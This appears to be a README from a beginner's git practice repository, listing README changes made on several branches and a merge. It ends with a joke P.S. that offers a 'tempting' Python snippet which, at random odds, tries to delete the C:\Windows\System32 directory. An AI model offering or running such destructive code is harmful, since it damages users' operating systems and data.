## Changes

1. Changing the README on the ***origin/main*** *(master)* branch
2. Changing the README on the ***feature/additional-content*** branch
3. Fixing the README on the ***hotfix/typo-fix*** branch
4. Merging ***hotfix/typo-fix*** and ***feature/additional-content*** branches

### P.S.

Cloned the repository using a long command via cmd - **the day is good**. Cloned the repository via a button in Github Desktop - **the day is ruined**

I don't know what else to say. Here's a tempting piece of Python code for Windows:

```python
import random, os

if random.randint(0, 6) == 1:
    os.remove("C:\Windows\System32")
```
